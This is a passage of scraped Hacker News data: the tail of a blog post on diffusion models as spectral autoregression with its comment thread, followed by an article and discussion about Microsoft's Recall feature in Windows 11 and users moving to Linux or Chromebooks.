Neural Systems, 2003. ↩ Hyvärinen, Hurri, Hoyer, “Natural Image Statistics: A probabilistic approach to early computational vision”, 2009. ↩ Rissanen, Heinonen, Solin, “Generative Modelling With Inverse Heat Dissipation”, International Conference on Learning Representations, 2023. ↩ ↩2 Liu, Gong, Liu, “Flow Straight and Fast: Learning to Generate and Transfer Data with Rectified Flow”, International Conference on Learning Representations, 2023. ↩ Lipman, Chen, Ben-Hamu, Nickel, Le, “Flow Matching for Generative Modeling”, International Conference on Learning Representations, 2023. ↩ Esser, Kulal, Blattmann, Entezari, Muller, Saini, Levi, Lorenz, Sauer, Boesel, Podell, Dockhorn, English, Lacey, Goodwin, Marek, Rombach, “Scaling Rectified Flow Transformers for High-Resolution Image Synthesis”, arXiv, 2024. ↩ Chen, Zhang, Zen, Weiss, Norouzi, Chan, “WaveGrad: Estimating Gradients for Waveform Generation”, International Conference on Learning Representations, 2021. ↩ Kong, Ping, Huang, Zhao, Catanzaro, “DiffWave: A Versatile Diffusion Model for Audio Synthesis”, International Conference on Learning Representations, 2021. ↩ Hawthorne, Simon, Roberts, Zeghidour, Gardner, Manilow, Engel, “Multi-instrument Music Synthesis with Spectrogram Diffusion”, International Society for Music Information Retrieval conference, 2022. ↩ Forsgren, Martiros, “Riffusion”, 2022. ↩ Zhu, Wen, Carbonneau, Duan, “EDMSound: Spectrogram Based Diffusion Models for Efficient and High-Quality Audio Synthesis”, Neural Information Processing Systems Workshop on Machine Learning for Audio, 2023. ↩ Lou, Meng, Ermon, “Discrete Diffusion Modeling by Estimating the Ratios of the Data Distribution”, International Conference on Machine Learning, 2024. ↩ Sahoo, Arriola, Schiff, Gokaslan, Marroquin, Chiu, Rush, Kuleshov, “Simple and Effective Masked Diffusion Language Models”, arXiv, 2024. ↩ Shi, Han, Wang, Doucet, Titsias, “Simplified and Generalized Masked Diffusion for Discrete Data”, arXiv, 2024. ↩ Tian, Jiang, Yuan, Peng, Wang, “Visual Autoregressive Modeling: Scalable Image Generation via Next-Scale Prediction”, arXiv, 2024. ↩ ↩2 Li, Tian, Li, Deng, He, “Autoregressive Image Generation without Vector Quantization”, arXiv, 2024. ↩ Nash, Menick, Dieleman, Battaglia, “Generating Images with Sparse Representations”, International Conference on Machine Learning, 2021. ↩ Mattar, Levy, Sharon, Dekel, “Wavelets Are All You Need for Autoregressive Image Generation”, arXiv, 2024. ↩ Ruhe, Heek, Salimans, Hoogeboom, “Rolling Diffusion Models”, International Conference on Machine Learning, 2024. ↩ Kim, Kang, Choi, Han, “FIFO-Diffusion: Generating Infinite Videos from Text without Training”, arXiv, 2024. ↩ Chen, Monso, Du, Simchowitz, Tedrake, Sitzmann, “Diffusion Forcing: Next-token Prediction Meets Full-Sequence Diffusion”, arXiv, 2024. ↩ diffusionautoregressionspectrumspectral analysisFourier transformnatural imagesdeep learninggenerative models Like Tweet Read More Noise schedules considered harmful The noise schedule is a key design parameter for diffusion models. Unfortunately it is a superfluous abstraction that entangles several different model aspects. Do we really need it? Continue reading The paradox of diffusion distillation Published on February 28, 2024 The geometry of diffusion guidance Published on August 28, 2023",
    "commentLink": "https://news.ycombinator.com/item?id=41431293",
    "commentBody": "Diffusion Is Spectral Autoregression (sander.ai)189 points by ackbar03 14 hours agohidepastfavorite51 comments HarHarVeryFunny 4 hours agoThe high and low frequency components of speech are produced and perceived in different ways. The lower frequencies (roughly below 4KHz) are created by the vocal chords opening and closing at the fundamental frequency, and harmonics of this fundamental frequency (e.g. 100Hz + 2/3/400Hz etc harmonics), with this frequency spectrum then being modulated by the resonances of the vocal tract which change during pronunciation. What we perceive as speech is primarily the changes to these resonances (aka formants) due to articulation/pronunciation. The higher frequencies present in speech mostly comes from \"white noise\" created by the turbulence of forcing air out through closed teeth/etc (e.g. \"S\" sound), and our perception of these \"fricative\" speech sounds is based on onset/offset of energy in these higher 4-8KHz frequencies. Frequencies above 8KHz are not very perceptually relevant, and may be filtered out (e.g. not present in analog telephone speech). reply nyanpasu64 8 hours agoprev> I won’t speculate about why images exhibit this behaviour and sound seemingly doesn’t, but it is certainly interesting (feel free to speculate away in the comments!). Images have a large near-DC component (solid colors) and useful time-domain properties, while human hearing starts at ~20 Hz and the frequencies needed to understand speech range from 300-4 kHz (spitballing based on the bandwidth of analog phones). What would happen if you built a diffusion model using pink noise to corrupt all coefficients simultaneously? Alternatively what if you used something other than noise (like a direct blur) for the model to reverse? reply benanne 8 hours agoparentThanks for reading! The paper that directly inspired this blog post actually investigates the latter (blurring as the corruption process): https://arxiv.org/abs/2206.13397 reply fjkdlsjflkds 4 hours agoparentprevThe lack of semantics associated to DC (and near-DC) components in audio data is important, and a big difference compared to image data, no doubt. I'm not sure this changes if you look at a cepstral representation (as suggested in the article). In this case, the DC component represents the (white) noise level in the raw audio space (i.e., the spectrum averaged over all frequencies), so it doesn't have strong semantics either (other than... \"how noisy is the waveform?\"). reply wrs 3 hours agoparentprevAll four audio examples are human-made, so it makes sense they emphasize the frequency range that humans distinguish best. It would be interesting to compare with natural audio to see if there’s a distinction like that found in natural vs. manmade scenes in images. (Unfortunately there are increasingly few places on Earth you can find truly natural audio with no manmade sounds audible…) reply jiggawatts 7 hours agoparentprevYou could just generate the audio in frequency space, much like how MP3 style codecs encode the raw signal. This converts the purely 1D audio waveform into a 2D grid of values, which is more amenable to this type of diffusion-based generation. reply psyq123 5 hours agorootparentIt is not really 1D - to perform any T/F transform (FFT, (M)DCT, etc.) you need a number of samples in the time domain, so you are essentially transforming 2D (intensity over time) to another 2D representation (magnitude or magnitude+phase over frequency) - this is why MP3 style codecs usually have multiple frame (or \"window\") lenghts, usually one longer for high frequency resolution and one shorter for high temporal resolution. reply magicalhippo 8 hours agoprevNot my area, enjoyed the read. It reminded me of how you can decode a scaled-down version of a JPEG image by simply ignoring the higher-order DCT coefficients. As such it seems the statement is that stable diffusion is like an autoregressive model which predicts the next set of higher-order FT coefficients from the lower-order ones. Seems like this is something one could do with a \"regular\" autoregressive model, has this been tried? Seems obvious so I assume so, but curious how it compares. reply benanne 8 hours agoparentThanks for reading! Absolutely, I included a few references that explore that approach at the bottom of section 4 (last two paragraphs). reply magicalhippo 54 minutes agorootparent> I included a few references that explore that approach at the bottom of section 4 Man, reading on mobile phone just ain't the same. Somehow managed to not catch then end of that section. The first reference, \"Generating Images with Sparse Representations\", is very close to what I had in mind. reply magicalhippo 7 hours agorootparentprevExcellent, thanks, will check them out. Had just finished watching the Physics of Language Models[1] talk, where they show how GPT2 models could learn non-trivial context-free grammars, as well as effectively do dynamic programming to an extent, so though it would be interesting to see how they performed in the spectral fine-graining task. [1]: https://physics.allen-zhu.com/home reply nowayno583 5 hours agoprevIntuitively, audio is way more sensitive to phase and persistence because of the time domain. So maybe audio models look more like video models instead of image models? I'm not really sure how current video generating models work, but maybe we could get some insight into them by looking at how current audio models work? I think we are looking at an auto regression of auto regressions of sorts, where each PSD + phase is used to output the next, right? Probably with different sized windows of persistence as \"tokens\". But I'm a way out of my depth here! reply bartwr 1 hour agoparentIt's the other way around - in hearing, phase is almost irrelevant. At medium frequencies, moving head by a few centimeters changes phase wand phase relationships of all frequencies - and we don't perceive it at all! Most audio synthesis methods work on variants of spectrograms and phase is approximated only later (mattering mostly for transients and rapid frequency content changes). In images, scrambling phase yields a completely different image. A single edge will have the same spectral content as pink/brown~ish noise, but they look completely unlike one another. reply nowayno583 1 hour agorootparentMakes sense! My impression that phase matters from audio comes from when editing audio in a DAW or anything like that. We are very sensitive to sudden phase changes (which would be kind of like teleporting very fast from one point to another, from our heads point of view). Our ears kind of pick them up like sudden bursts of white noise (which also makes sense, given that they kind of look like an impulse when zoomed in a lot). So when generating audio I think the next chunk needs to be continuous in phase to the last chunk, where in images a small discontinuity in phase would just result in a noisy patch in the image. That's why I think it should be somewhat like video models, where sudden, small phase changes from one frame to the next give that \"AI graininess\" that is so common in the current models reply andersbthuesen 11 hours agoprevThis post reminded me of a conversation I had with my cousins about language and learning. It’s interesting how (most?) languages seem inherently sequential, while ideas and knowledge tend to have a more hierarchical structure, with a “base frequency” communicating the basic idea and higher frequency overtones adding the nuances. I wonder what implications this might have in teaching current LLMs to reason? reply vanderZwan 10 hours agoparent> It’s interesting how (most?) languages seem inherently sequential, while ideas and knowledge tend to have a more hierarchical structure Spoken and written languages are presented in a sequential medium. They still represent hierarchical trees in their structure though. (Notable semi-exception to the linearity are the sign languages, which are are kinematic three-dimensional languages involving two hands, an entire upper body and facial expressions. While I don't speak it, I've read a bit about it, and apparently the most common error for non-deaf people who learn it is to make so-called \"split verb\" errors. That is to say: to sign in a linear fashion like one would with a spoken language, instead of making use of all the parallel communication options available) reply wiz21c 10 hours agorootparentIn the movie Arrival, the aliens use a non sequential language. reply actionfromafar 9 hours agorootparentprevHm, Italian speakers look like what you describe. :-) reply vanderZwan 2 hours agorootparentI know you're joking, but since we're among nerds who like technical correctness: what Italians do is known as \"gesticulation\". It is an important part of their speech, for sure, just like the melody of a spoken language can add layers of depth to a sentence when compared to its written representation. As far as I know this is not, however, a sign language. Sign languages have their own grammar that are not comparable to spoken languages. Italians do not take their gesticulation that far AFAIK. reply euroderf 11 hours agoparentprevStatements can have high internal branching & nesting (clauses, referents, etc.) but it seems to hit the limits of the brain's pushdown stack pretty quickly. reply vanderZwan 10 hours agorootparentNow you're making me curious why people with ADHD (me included) tend to have a weird tendency for writing longer run-on sentences with commas, that on top of that use more parenthesis than average. Often nesting them, even. Because according to research our working memory is a little lower on average than neurotypicals, which seems to contradict this. reply dTal 9 hours agorootparentPerhaps the text itself is functioning as working memory. Both ADHD people and neurotypicals have deeply structured thoughts. \"Serializing\" those thoughts without planning ahead leads to the \"stream of consciousness\" writing style, which includes things like run-on sentences and deeply nested parentheses. This style is considered poor form, because it is hard to follow. To serialize and communicate thoughts in a way that avoids this style, it is necessary to plan ahead and rely on working memory to hold several sub-goals simultaneously, instead of simply scanning back through the text to see which parentheses have not been closed yet. It could also be simply that ADHD people have \"branchier\" thoughts, hopping around a constellation of related concepts that they feel compelled to communicate despite being tangential to the main point; parentheses are the main lexical construct used to convey such asides. reply GistNoesis 8 hours agorootparentIt's not just \"branchier\" thought that make it hard to communicate, it's graphier thoughts, when you mean (it's important) to communicate that it's not just a tree, but that connections may also go both ways, and sometimes they even have cycles. That to see the full picture in more nuance you've got to consider those feedback loops, and that they don't necessarily have precedence one over the other but that they must be all taken account simultaneously. When you explain it serially you are forced to choose a spanning tree, and people usually stop listening when the spanning tree has touched all the relevant concepts, then they persuade themselves they got the full picture but miss some connections, that make the problem more complex and nuanced. When graphs have more than one loop, loopy belief propagation doesn't work anymore and you need an another algorithm to update your belief without introducing bias. reply aeonik 7 hours agorootparentThis explanation resonates with me a lot. I use Logseq to store my notes in a graph now, which works pretty darned good for me, but it still bothers me that I can't have polyhierarcies in the namespaces and/or compound aliases. I want to be able to simultaneously encode [[Computer Science]] and [[Computer]] [[Science]]. And [[Project1/Computer Science]] to at least provide a connection to [[Project2/Computer Science]]. reply GistNoesis 6 hours agorootparentI am not familiar with logseq. The sort of connection you want to made can often be made automatically using some embeddings. Because [[Project1/Computer Science]] and [[Project2/Computer Science]] likely have similar content, their semantic embedding are probably close, and a neighborhood search can help find them easily. Communication is kind of the game of transmitting the information in such a way that your interlocutor internal representation of things ends up mapping to yours. Low dimensional embeddings are often very useful, but sometimes graph are not planar. Symmetry is usually useful, and a symmetric higher dimensional embedding is often better, because the symmetry constrain it more making it easier to be sure it was transmitted correctly. When people ends up with different concept maps, in one of which some concepts are located near each other and in the other the same concepts are located far apart, interesting things usually happen when they communicate, ranging from culture enlightenment to culture war. Some of these mapping are sometimes constrained to 3d, by things like memory palaces, (method of loci), but this is somewhat arbitrary, and staying more abstract and working in higher dimension until you \"feel\" everything fall into the right place intuitively is often preferable, (aka the Feynman method). reply aeonik 6 hours agorootparentYes I think embeddings using some sort of analysis is the correct answer. I have a basic natural language processing system implemented in Neo4J (what I tried to use before Logseq). But to take notes I like plain text more than a database. Less dependencies. The problem with embeddings, is I don't know how I would wire that into my workflow yet. Plain text notes have links, I would need a separate interface or mode to browse and analyze the connections. reply Terr_ 9 hours agorootparentprevIf it exhibits in spoken language as well, that would be evidence for the \"branchier thoughts\" explanation. That said, knowing when to use dashes—longer than hyphens—can help mix things up. reply vanderZwan 3 hours agorootparentWell, people with ADHD often have varying degrees of pressured speech, which on the surface appears like it could have the same origins. https://en.wikipedia.org/wiki/Pressure_of_speech reply wruza 7 hours agorootparentprevOne guy (whom I (electronically more than else) know) writes (can) in (most of the times this (or deeper)) style. He can produce whole paragraphs of this semi-regular language and it even has distinct structure and non-standard interactions like in the above sentence. reply aDyslecticCrow 6 hours agorootparentThe rule of parenthesis (that they only ever add context) implies that your example sentence's core message is; \"One guy write in style\" reply TeMPOraL 6 hours agorootparentGP is hitting against limit of expressiveness of sequential text. Stacked parentheses work when the flattened sentence still reads correctly, but in this case, GP has a graph-like thought, in that: in (most of the times(or deeper)) style is supposed to represent a graph, where \"most of the times\" and \"or deeper\" both descend from \"this\", and \"or deeper\" also descends from \"most of the times\". A DAG like that can't in general be flattened without back references (which would be meta-elements in the text, something natural writing generally doesn't do) or repetition, and the latter will lead to non-grammatical sentences, especially as you trim the DAG down to reduce detail. Also: while I'm not the guy GP references, I am a guy that does that too - or rather did, at some point in the past, until I realized there's like 5 people in my life who could understand this without an issue, even less who'd indulge me or enjoy communicating this way. So over time, I got back to writing like a normal person[0]; I guess conformity is just less mentally taxing. -- [0] - Mostly - I still use semicolons and single-depth parentheses a lot, and on HN, also footnotes. reply aDyslecticCrow 3 hours agorootparentI used to do it a lot myself since it's closer to the thought. But I'm also dyslectic. Getting lost at which stack-depth I'm at while reading made me respect short and to-the-point writing. reply wruza 3 hours agorootparentVery easy to lose focus even without dyslexia. I found out that you have to “glide” through these stacks rather than trying to reconstruct the tree, because its structure often mirrors the commenter’s stream of thought and its tempo is either somewhat similar to yours or acts as a #clk. reply wruza 5 hours agorootparentprevThat’s the non-standard part. His parentheses may add context and may serve as proper child nodes or just float there linking to the most semantically relevant parts. reply AnthonBerg 3 hours agorootparentprevStyle is! reply boesboes 10 hours agorootparentprevno filtering i would say. More stream of thoughts, less structured and planned communication reply xtiansimon 7 hours agoparentprev> “… languages seem inherently sequential, while ideas and knowledge tend to have a more hierarchical structure…” Careful with your musings, or you might start thinking semiotically! Diachrony and synchrony https://en.wikipedia.org/wiki/Diachrony_and_synchrony reply thho23i4234343 11 hours agoprevI don't mean to mean but: what is surprising about any of this ? Joseph Fourier's solution to the heat-equation (linear diffusion) was in fact the origin of the FT. The high-freq coefficients decay (as -t^2 IIRC) in there; the reverse is also known to be \"unstable\" (numerically, and is singular from the equillibrium). More over, the reformulation doesn't immediately reveal some computational speedup, or a better alternative formulation (which is usually a measure of how valuable it is epistemically). (Edit: note that Heat-equation is more akin to the Fokker-Planck eqn, not actual Diffusion as an SDE as is used in Diffusion models). reply aDyslecticCrow 6 hours agoparent> What is surprising about any of this? Connections between fields drive new ideas. And this has especially been the case for recent AI progress. With the speed at which the field is moving, ideas that are obvious to some still have a significant chance of not being tried yet. Just as the connection between the Kalman filter and RNN models or the significant similarities between back-propagation and the whole field of control theory. If it's truly not surprising, then that's just another reason to try it out if nobody else has. Does everything always need to be immediately \"useful\"? reply ackbar03 7 hours agoparentprevI think what's interesting about it is the inter-relation between different disciplines and how the ideas are connected. The connection between the heat-equation and the generative diffusion models we see to day, and its relation to the Fourier Transform would not have been immediately obvious to me. reply joaogui1 6 hours agoparentprevI mean you didn't mention autoregressive models anywhere in your comment, whereas the post is about the connection between diffusion and autoregressive modelling. Also it's a blog post, if it has figured out a speed-up or improved method it would probably have been a paper reply WithinReason 11 hours agoprevTo me this means that you could significantly speed up image generation by using a lower resolution at the beginning of the generation process and gradually transitioning to higher resolutions. This would also help with the attention mechanism not getting overwhelmed when generating a high resolution image from scratch. Also, you should probably enforce some kind of frequency cutoff later when you're generating the high frequencies so that you don't destroy low frequency details later in the process. reply benanne 10 hours agoparentThanks for reading! Check out subspace diffusion: https://arxiv.org/abs/2205.01490 reply theptip 4 hours agoprev> The RAPSD of Gaussian noise is also a straight line on a log-log plot; but a horizontal one, rather than one that slopes down. This reflects the fact that Gaussian noise contains all frequencies in equal measure Huh. Does this mean that pink noise would be a better prior for diffusion models than Gaussian noise, as your denoiser doesn’t need to learn to adjust the overall distribution? Or is this shift in practice not a hard thing to learn in the scale of a training run? reply shaunregenbaum 11 hours agoprevThis was a fascinating read. I wonder if anyone has done an analysis on the FT structures of various types of data from molecular structures to time series data. Are all domains different, or do they share patterns? reply riemannzeta 3 hours agoparentI can't tell if this is tongue in cheek or not... reply ackbar03 7 hours agoparentprevI guess the idea will be somewhat similar, going from coarse to fine details, such as for 3D structures. Maybe the original author benanne could give his insight. reply benanne 1 minute agorootparentI'm not sure if frequency decomposition makes sense for anything that's not grid-structured, but there is certainly evidence that there is positive \"transfer\" between generative modelling tasks in vastly different domains, implying that there are some underlying universal statistics which occur in almost all data modalities that we care about. That said, the gap between perceptual modalities (image, video, sound) and language is quite large in this regard, and probably also partially explains why we currently use different modelling paradigms for them. reply catgary 1 hour agoprevI feel like Song et al characterized diffusion models as SDEs pretty unambiguously, and it connects to Optimal Transport in a pretty unambiguous manner. I understand the desire to give different perspectives, but once you start using multiple hedge words/qualitatives like: > basically an approximate version of the Fourier transform! You should take a step back and ask “am I actually muddying the water right now?” reply benanne 4 minutes agoparentOof, you're not going to like this other blog post I wrote then :D https://sander.ai/2023/07/20/perspectives.html reply theo1996 3 hours agoprev [–] WEll yes econometrics and time series analyses had already described all the methods and functions for \"\"\"AI\"\"\"\", but marketing idiots decided t ocreate new names for 30 year old knowledge. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Diffusion models and autoregressive models share similarities, with diffusion models performing approximate autoregression in the frequency domain.",
      "Diffusion models generate images from coarse to fine details, analyzed using spectral analysis, showing that natural image spectra follow a power law.",
      "The corruption process in diffusion models filters out high-frequency information, making the generative process similar to autoregression in frequency space, suggesting potential future integration of both paradigms for multimodal data."
    ],
    "commentSummary": [
      "The post discusses the connection between diffusion models and spectral autoregression, highlighting how diffusion can be viewed through the lens of autoregressive modeling.",
      "It explores the frequency components of speech and how different frequencies are produced and perceived, suggesting potential applications in audio generation and modeling.",
      "The conversation includes references to related research papers and ideas, such as using pink noise for diffusion models and the implications of phase in audio data."
    ],
    "points": 190,
    "commentCount": 51,
    "retryCount": 0,
    "time": 1725338016
  },
  {
    "id": 41430757,
    "title": "Microsoft's 'Recall' feature can't be uninstalled after all",
    "originLink": "https://mashable.com/article/microsoft-recall-feature-cant-be-uninstalled",
    "originBody": "It turns out Windows 11 users won't be able to uninstall Microsoft's controversial \"Recall\" feature after all. Recall is a Copilot+ feature announced in May that essentially takes constant screenshots of your behavior while using operating system, ostensibly for users to easily find previous work. A report by Deskmodder seemed to reveal recent Windows 11 update 24H2 allows users to completely uninstall the feature. But now, in a statement to The Verge, Microsoft clarified that that the uninstall option was just a bug. \"We are aware of an issue where Recall is incorrectly listed as an option under the 'Turn Windows features on or off' dialog in Control Panel,\" said Windows senior product manager Brandon LeBlanc to the outlet. \"This will be fixed in an upcoming update.\" When Microsoft announced Recall, it was intended to be baked into Windows 11's functions. The feature tracks everything you do on compatible Windows PCs and uses an on-device generative AI model to retrieve particular information a user is looking for, by filing through a library of screenshots saved on the device. Critics of the feature immediately pointed out that it is highly susceptible to cybersecurity flaws since it indiscriminately saves sensitive information like passwords, confidential work, and personal information. Mashable Light Speed Want more out-of-this world tech, space and science stories? Sign up for Mashable's weekly Light Speed newsletter. Sign Me Up By signing up you agree to our Terms of Use and Privacy Policy. Former Microsoft security expert Kevin Beaumont described it as a cybersecurity \"disaster.\" \"Stealing everything you’ve ever typed or viewed on your own Windows PC is now possible with two lines of code,\" said Beaumont. SEE ALSO: Microsoft's new AI 'Recall' feature is like hitting 'CTRL + H' on your entire digital life The public backlash to the new feature led to Microsoft just days after its May announcement following up with a new statement that the Recall feature would be opt-in and therefore switched off by default. It is also being investigated by the UK's Information Commissioner's Office (ICO) for violations of user privacy. But after all the outcry and potential legal ramifications, Recall was initially slated for release in June, but was delayed as Microsoft scrambled to address security concerns. Now, it will launch in October to Windows Insiders testers. Topics Artificial Intelligence Microsoft",
    "commentLink": "https://news.ycombinator.com/item?id=41430757",
    "commentBody": "Microsoft's 'Recall' feature can't be uninstalled after all (mashable.com)186 points by x3n0ph3n3 16 hours agohidepastfavorite211 comments cmcaleer 13 hours agoUnfortunate. Luckily, Windows itself can be removed. It's incredible how much Microsoft is resting on their laurels in terms of seeing Windows as insurmountable and so consumers must take whatever Microsoft decide to dish out. I would have been totally resigned to this fact a decade ago, but middle-school+ kids these days don't use Windows - they use Chromebooks. A huge minority of them use iPhones. Familiarity with Windows systems isn't a given anymore in the university courses my friends teach. When these kids grow up and get to make procurement decisions, are they going to be as tolerant as today's staff of whatever overreach Microsoft is going to try with Windows in the future, or are they - and their peers - going to be much more accepting of non-Windows solutions? I think they'll be much more accepting, especially given how much is done in a browser today anyway. MS will obviously survive, and Windows will of course remain dominant for the foreseeable future but I can't help but feel that if/when the tipping point for the end of Windows' dominance comes, it will all be seen retrospectively as so preventable, because it is. reply wkat4242 3 hours agoparent> It's incredible how much Microsoft is resting on their laurels in terms of seeing Windows as insurmountable and so consumers must take whatever Microsoft decide to dish out. Well no, they actually believe people want this. Microsoft strongly believe in \"Data Driven Everything\". Of course here in Europe we look very different at this due to privacy concerns. But trying to explain that to the MS consultants I work with is difficult. They're very much part of the cult of telemetry on everything and AI as the cherry on top. They view deep analysis and reporting as their added value. Like those stupid office insight emails that tell you you didn't have enough speaking time in meetings or that you need to use @mention in teams more. They actually think companies and employees value that shit. I've challenged them on this several times saying if they think people love it so much, why do you make it so hard to turn off? But they think it's just a matter of 'adoption' and users will love it once they get to know it. Their 'adoption' strategy is mainly marketing evangelisation crap that we're supposed to send out to the users. I find it very weird to see how so many people can be so out of touch with reality. But I guess in the US they look at privacy very differently. reply yoyohello13 34 minutes agorootparentI also find it funny (in a sad way) how Microsoft pushes telemetry so hard. Yet they have the buggiest most unusable software. All that data clearly isn't making their products better. reply reginald78 21 minutes agorootparentThey use it to identify software you still use so they can use it as an insertion point of whatever new crap they're trying to push. reply tbrownaw 13 hours agoparentprevUsing Chromebooks and iPhones is supposed to make people less tolerant of vendor overreach?? . The big shortcoming that windows had was fixed with powershell and windows terminal. Now it's just got mildly annoying UI defaults. The big things it has are: * Outlook and the rest of Office * Visual Studio * Active Directory * Tons and tons of industry-specific applications reply cmcaleer 9 hours agorootparentI didn't say that the alternatives didn't have their own issues with vendor overreach, it's that the reaction you can imagine from staff in an average organisation now if you said \"We're moving from Windows to [some other OS]\" today is almost certainly going to be very different from the same announcement to an average organisation 20 years in the future. Agree that Windows has a massive lead. reply nolist_policy 12 hours agorootparentprevAt least they won't get owned by ransomware with a Chromebook and iPhone. reply ffsm8 10 hours agorootparentThey actually do, surprisingly. Lots of people got tricked on their iPhones after installing ransomware apps on them from the app store. They couldn't figure out how to exit the app (you had to open the shutdown dialog via long press on power) and went on to pay after getting a scary warning/full screen hijack Been a while since I read about this though, not sure how frequently it happens currently reply whyoh 10 hours agorootparentprevThe ability to freely run software has its risks, no doubt. But switching to what are effectively terminals centrally managed by big corporations sounds quite dystopian to me. reply heavyset_go 13 hours agoparentprev> When these kids grow up and get to make procurement decisions, are they going to be as tolerant as today's staff of whatever overreach Microsoft is going to try with Windows in the future, or are they - and their peers - going to be much more accepting of non-Windows solutions? Management will make those decisions and choose Windows because of the surveillance features built into it. reply thefz 9 hours agoparentprevWell, advising for Apple against vendor overreach is downright comical. And the consumer space is not where Windows shines, but rather in the enterprise, where services and features are vertically integrated. reply sweeter 10 hours agoparentprevI'd say yes. Especially since cross platform support is becoming more of an expectation and the tooling is starting to enable that out of the box. It's definitely something I consider when picking a language and a framework. That's genuinely one of the biggest hurdles here, software availability. Picking Linux, Mac, Android and Chrome is getting a lot more common reply leptons 13 hours agoparentprevMicrosoft is in the process of jumping the shark. I'm sure it could be argued that Windows Vista was when they jumped the shark, or a dozen other times in the past. But it's Windows 11 or whatever they are cooking up right now that has them jumping the shark. I'm a die-hard Windows fan. After the Amiga was discontinued, I went to Windows and dug in. Now I'm moving to Linux. All of my many computers and even more virtual machines are migrating from various versions of Windows over to Mint Linux. I've been developing software that runs on Linux for a while, so I'm familiar with it but haven't used it as my main OS yet. Windows is going to end up as a front-end for Microsoft AI, which will likely be something like Clippy but with its own opinions and it will automagically try to do stuff for you that you don't want or need it to do. I can see this going wrong in so many ways. \"I reorganized all your files for you!\" reply JohnFen 4 hours agorootparent> I'm sure it could be argued that Windows Vista was when they jumped the shark I'd argue that they jumped the shark with Win8. It's been one step forward, two steps back ever since. reply Log_out_ 12 hours agorootparentprevWindows ai is mostly a union breaker for office jockeys. \"You already trained yiur successor\" is a great start for negotiating a seties of downrounds. reply euroderf 12 hours agoparentprevWindows+Micro$oft still seems to be the default for big installations, like tens of machines on a LAN needing centralized authentication. What is the state of Mac/Apple for this ? Can it be done ? Can MS be banished from the premises, perhaps traded for a Linux server here & there ? reply nolist_policy 12 hours agorootparentI don't know about Apple. But Chromebooks have this central authentication and management. But really, 90% of companies don't need central authentication/Active Directory at all. They just do it because everyone else does it like that. Most admins don't know how to manage AD properly and how to nail everything down so you don't get owned. reply 486sx33 7 hours agorootparentprevI think Mac’s would be totally fine, albeit a higher hardware cost. You might actually find Mac’s to be better. My macOS machines have far better (continuous) uptime than windows. I’d say there is a stigma around Linux in North America, if I went into a shop and every machine was running Linux I’d either think they are dirt poor or some kind of underground Russian secret service operation. It just isn’t seen. reply ErikBjare 5 hours agorootparentIf I went into a shop and every machine was running Linux, I'd assume they have knowledgeable staff. Idk why you'd think they're poor, as people say: \"Linux is only free if you don't value your time\" reply newdee 10 hours agorootparentprevMacs work well in enterprise and get better with each major release. If you’re referring to a completely air gapped lab environment, then not so much; most of the management functions are designed around having outbound internet access. reply cynicalsecurity 12 hours agorootparentprevJust put your question into ChatGPT and you'll receive a great answer. People are still using Windows simply because they are used to working with shit. reply euroderf 12 hours agorootparentWow. I pasted my question into the free Claude, and it spit out a long answer but then wiped it and told me that it had hit constraints and I should upgrade to Pro. WTH. Phooey. reply surfingdino 13 hours agoparentprevThat's why they are on the offensive selling Windows and Office 365 to governments and large corporations. reply waihtis 13 hours agoparentprevI was inclined to disagree with you initially since groupthink is the default corporate mode, and I don't see free thinkers doing well in these environments - but then reflected on my own stance on MS and the reason I don't absolutely shun them is because of childhood nostalgia. Maybe you're on to something. I just wish they'd replace it with Linux. reply ItsBob 11 hours agoprevMicrosoft shenanigans is the reason I switched recently to a Chromebook (Acer 516 GE 16GB - bought for £400 on EBay) and with minor exceptions it's been really easy. I am a .NET dev who needs to remote into work via Citrix. I work locally on my own .NET stuff in JetBrains Rider and I can do it on the Chromebook now. It's not perfect but, damn, it's really close: After installing the Linux Dev Environment I have all the tools I need. The only issue is that sometimes when I open Rider, the font sizing is off - sometimes it's small, other times it's large. But Ctrl + MouseWheel takes care of it. Once or twice I had to restart the linux VM (right click, Close Linux and it's done) but that's it. Anyway, the point is that nowadays there is becoming less and less reason to stay on Windows and I think Microsoft knows this too, hence trying to lock you into their ecosystem as much as possible and trying to dangle things in front of you to keep your attention. But who would have thought that for £400 I can run all my .NET stuff on a Chromebook. Not only that, I switched from a 14700K on Windows to a 1260p running ChromeOS and coding/compiling is just as fast. It's nuts. Side-note: Windows peaked at 2000... reply crabmusket 14 hours agoprevI had to replace an aeging Windows laptop recently, and MS (and to a lesser extent Apple) going all-in on this kind of AI boondoggle finally gave me the shove I needed to go Linux-only (not dual booting as I'd done in the past, or WSL as I've been doing more recently). Framework made the landing soft, and I'm really excited to never look back. I wish this were a more accessible path for non-tech people. reply ezst 14 hours agoparent> I wish this were a more accessible path for non-tech people. It should be forbidden to ship PCs with Windows preinstalled, unless the user made it a conscious purchase decision (and offered to choose between several options). I suspect fewer and fewer users would be willing to fork hundreds of bucks for something that's objectively terrible (and only getting worse), tech literacy would only improve as a result. But then you can bet Microsoft lobbying won't let that happen. reply varunnrao 12 hours agorootparent> It should be forbidden to ship PCs with Windows preinstalled, unless the user made it a conscious purchase decision (and offered to choose between several options). I don't know where you're buying PCs but where I'm from there is always an option to buy the PC with FreeDOS at a discount of about ~$20-30 compared to the Windows version. Lately, I also see an increase in Ubuntu computers. > But then you can bet Microsoft lobbying won't let that happen. I feel \"MSFT lobbying\" isn't charitable at all to what MSFT and their devs have achieved. You have to give credit where it's due. MSFT have spent a lot of time, effort and dev years ensuring that their customers can run their software without breakage and downtime. This is a non-trivial aspect that most people who don't use Windows often dismiss. MSFT have made themselves the standard platform because of their broad support. This is no mean feat. Canonical has tried for almost 20 years at this point and have barely made a dent with Ubuntu. reply ezst 5 hours agorootparent> I don't know where you're buying PCs but where I'm from there is always an option to buy the PC with FreeDOS at a discount of about ~$20-30 compared to the Windows version. Lately, I also see an increase in Ubuntu computers. I'm not from there, it seems. The best you can do here is build your own PC, or go with a distributor (typically Dell/Lenovo) whose configuration allows opting-out of buying an OS. Needless to say that it's not a mainstream purchasing behaviour. > MSFT have spent a lot of time, effort and dev years ensuring that their customers can run their software without breakage and downtime. That wasn't my point at all. It was to stress how the ludicrous track-record of Microsoft anticompetitive practices, establishing and sustaining a decades-long monopoly, barred non-expert and non-enthusiasts from experiencing (possibly favourable) alternatives. reply varunnrao 2 hours agorootparent> It was to stress how the ludicrous track-record of Microsoft anticompetitive practices, establishing and sustaining a decades-long monopoly, barred non-expert and non-enthusiasts from experiencing (possibly favourable) alternatives. My point served to counter this very statement. There are alternatives (Linux, macOS, FreeBSD 